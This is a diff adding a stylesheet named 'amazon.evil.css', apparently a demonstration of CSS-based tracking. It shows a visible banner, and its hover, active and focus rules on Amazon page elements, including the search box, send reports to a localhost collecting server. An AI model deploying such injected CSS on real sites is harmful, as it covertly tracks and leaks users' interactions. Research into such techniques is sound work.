@@ -1,0 +1,84 @@
+body::before {
+    content: "You loaded amazon.evil.css!";
+    position: fixed;
+    top: 0;
+    left: 0;
+    font-size: 12px;
+    font-family: "Courier New", serif;
+    background-color: #bb1200;
+    width: 100%;
+    text-align: center;
+    color: white;
+    z-index: 999;
+}
+
+/* All Hover Listener */
+#desktop-grid-1:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-1") !important;
+}
+
+#desktop-grid-2:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-2") !important;
+}
+
+#desktop-grid-3:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-3") !important;
+}
+
+#desktop-grid-1-D1:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-1-D1") !important;
+}
+
+#desktop-grid-1-D2:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-1-D2") !important;
+}
+
+#desktop-grid-2-AB:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-2-AB") !important;
+}
+
+#desktop-grid-4:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-4") !important;
+}
+
+#desktop-grid-5:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-grid-5") !important;
+}
+
+#desktop-1:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-1") !important;
+}
+
+#desktop-2:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-2") !important;
+}
+
+#desktop-btf-grid-1:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-btf-grid-1") !important;
+}
+
+#desktop-btf-grid-2:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-btf-grid-2") !important;
+}
+
+#desktop-btf-grid-3:hover {
+    background-image: url("http://localhost:3000/report?type=hover&payload=%23desktop-btf-grid-3") !important;
+}
+
+/* All Active Listener */
+a.a-carousel-goto-prevpage:active {
+    background-image: url("http://localhost:3000/report?type=active&payload=a.a-carousel-goto-prevpage") !important;
+}
+
+a.a-carousel-goto-nextpage:active {
+    background-image: url("http://localhost:3000/report?type=active&payload=a.a-carousel-goto-nextpage") !important;
+}
+
+#nav-search .nav-search-submit .nav-input:active {
+    background-image: url("http://localhost:3000/report?type=active&payload=%23nav-search%20.nav-search-submit%20.nav-input") !important;
+}
+
+/* All Focus Listener */
+#twotabsearchtextbox:focus {
+    background-image: url("http://localhost:3000/report?type=focus&payload=%23twotabsearchtextbox") !important;
+}
